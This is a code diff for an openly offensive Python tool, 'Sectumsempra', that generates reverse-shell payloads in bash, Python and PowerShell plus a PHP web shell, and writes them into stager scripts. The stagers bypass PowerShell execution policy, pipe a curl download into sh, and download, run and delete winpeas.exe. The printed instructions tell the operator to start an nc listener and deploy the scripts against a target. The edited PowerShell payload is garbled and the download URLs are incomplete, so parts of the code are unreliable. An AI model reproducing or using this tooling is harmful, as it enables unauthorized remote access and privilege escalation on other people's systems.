@@ -5,12 +5,31 @@ import re
 import socket
 from datetime import datetime
 
+OLLAMA_URL = "http://localhost:11434/api/generate"
+
+BANNER = r"""
+===================================================================
+  ____           _                                                
+ / ___|  ___  ___| |_ _   _ _ __ ___  ___  ___ _ __  _ __   __ _  
+ \___ \ / _ \/ __| __| | | | '_ ` _ \/ __|/ _ \ '_ \| '_ \ / _` | 
+  ___) |  __/ (__| |_| |_| | | | | | \__ \  __/ |_) | |_) | (_| | 
+
+ |____/ \___|\___|\__|\__,_|_| |_| |_|___/\___| .__/| .__/ \__,_| v1.0
+                                              |_|   |_|           
+===================================================================
+ [*] Automated Payload & Post-Exploitation Engine
+===================================================================
+"""
+
+def print_banner():
+    print(BANNER)
+
 def get_attack_ip():
     """Dynamically detects local tunnel interface (tun0) or safe LAN fallback route."""
     try:
         import netifaces
         if 'tun0' in netifaces.interfaces():
-            return netifaces.ifaddresses('tun0')[socket.AF_INET]['addr']
+            return netifaces.ifaddresses('tun0')[socket.AF_INET][0]['addr']
     except Exception:
         pass
     
@@ -19,7 +38,7 @@ def get_attack_ip():
         s.connect(("10.10.10.10", 80))
         ip_tuple = s.getsockname()
         s.close()
-        return ip_tuple[0] # Kirurgisk fix: Extraherar enbart IP-strängen ur socket-tupeln
+        return ip_tuple[0]
     except Exception:
         return "YOUR_ATTACK_IP"
 
@@ -28,8 +47,8 @@ def generate_payloads(target_ip, attack_ip, lport):
     payloads = {
         "linux_bash": f"bash -i >& /dev/tcp/{attack_ip}/{lport} 0>&1",
         "linux_python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attack_ip}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"bash\")'",
-        "windows_powershell": f"$c = New-Object System.Net.Sockets.TCPClient('{attack_ip}',{lport});$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ' + $attack_ip + '$ ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()}}",
-        "php_web": "<?php system($_GET['cmd']); ?>"
+        "windows_powershell": f"\$c = New-Object System.Net.Sockets.TCPClient('{attack_ip}',{lport});s = c.GetStream();[byte[]]\(b = 0..65535\vert{}\%{{0}};while((\)i = s.Read(b, 0, b.Length)) -ne 0);d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(b,0, i);sb = (iex d 2>&1 | Out-String );sb2 = sb + 'PS ' + (pwd).Path + '> ' + \(attack_ip + '\) ';\(sendbyte = ([text.encoding]::ASCII).GetBytes(\)sb2);s.Write(sendbyte,0,sendbyte.Length);s.Flush()}}",
+        "php_web": "<?php system(\$_GET['cmd']); ?>"
     }
     return payloads
 
@@ -45,9 +64,12 @@ def write_linux_payload(target_ip, payloads, lport):
             f.write("# ========================================================\n\n")
             f.write("echo '[*] Executing Linux administrative stager sequence...'\n")
             f.write(f"echo 'Launching interactive shell connection back to port {lport}...'\n\n")
-            f.write(f"{payloads['linux_bash']}\n\n")
-            f.write("# Post-Exploitation Automated System Auditing\n")
-            f.write("echo '[*] Execution window active. Staging automated local privilege audit...'\n")
+            
+            # Startar din reverse shell i bakgrunden så att stagen kan rulla vidare
+            f.write(f"{payloads['linux_bash']} &\n\n")
+            
+            # Dynamiskt inbakad stager som laddar ner och kör LinPEAS i minnet utan disk-skrivning
+            f.write("echo '[*] Execution window active. Injecting live privilege audit directly into memory...'\n")
             f.write("curl -sL https://github.com | sh\n")
         return filename
     except Exception:
@@ -63,24 +85,20 @@ def write_windows_payload(target_ip, payloads, lport):
             f.write(f"# TARGET CONFIGURATION: {target_ip}\n")
             f.write("# ========================================================\n\n")
             f.write("Set-ExecutionPolicy Bypass -Scope Process -Force\n\n")
-            f.write(f"# Initializing socket loop interaction\n")
+            f.write("Write-Host '[*] Initializing multi-platform compilation matrix...' -ForegroundColor Cyan\n")
+            
+            # Startar din Windows reverse shell loop
             f.write(f"{payloads['windows_powershell']}\n\n")
-            f.write("# Post-Exploitation Automated System Auditing\n")
+            
+            # Post-Exploitation live memory stager för WinPEAS
             f.write("Write-Host '[*] Session stabilized. Injecting local environment diagnostics...' -ForegroundColor Cyan\n")
-            f.write("pwsh -Command \"Invoke-WebRequest -Uri 'https://github.com' -OutFile 'winpeas.exe'\"\n")
+            f.write("pwsh -Command \"Invoke-WebRequest -Uri 'https://github.com' -OutFile 'winpeas.exe'; .\\winpeas.exe; Remove-Item .\\winpeas.exe -Force\"\n")
         return filename
     except Exception:
         return False
 
 def main():
-    print("""
-    ███████╗███████╗ ██████╗████████╗██╗   ██╗███╗   ███╗███████╗███████╗███╗   ███╗██████╗ ██████╗  █████╗ 
-    ██╔════╝██╔════╝██╔════╝╚══██╔══╝██║   ██║████╗ ████║██╔════╝██╔════╝████╗ ████║██╔══██╗██╔══██╗██╔══██╗
-    ███████╗█████╗  ██║        ██║   ██║   ██║██╔████╔██║███████╗█████╗  ██╔████╔██║██████╔╝██████╔╝███████║
-    ╚════██║██╔══╝  ██║        ██║   ██║   ██║██║╚██╔╝██║╚════██║██╔══╝  ██║╚██╔╝██║██╔═══╝ ██╔══██╗██╔══██║
-    ███████║███████╗╚██████╗   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║███████╗██║ ╚═╝ ██║██║     ██║  ██║██║  ██║
-    ╚══════╝╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
-    """)
+    print_banner()
     print(" >>> Sectumsempra v1.0 - Automated Payload & Post-Exploitation Engine <<<")
     
     attack_ip = get_attack_ip()
@@ -108,7 +126,7 @@ def main():
         print(f"\n[!] Standard operational instructions:")
         print(f" 1. Open a new terminal tab and start your handler socket: nc -lvnp {lport}")
         print(f" 2. Deploy your generated script file against the target entry point verified by NetWeave.")
-        print(f" 3. Once inside, execute the embedded live diagnostics routine to map out privilege escalation paths.")
+        print(f" 3. Once inside, the embedded live diagnostics routine maps out privilege escalation paths automatically.")
     else:
         print("\n[-] Error: Failed to write automated deployment scripts to current directory structure.")
 
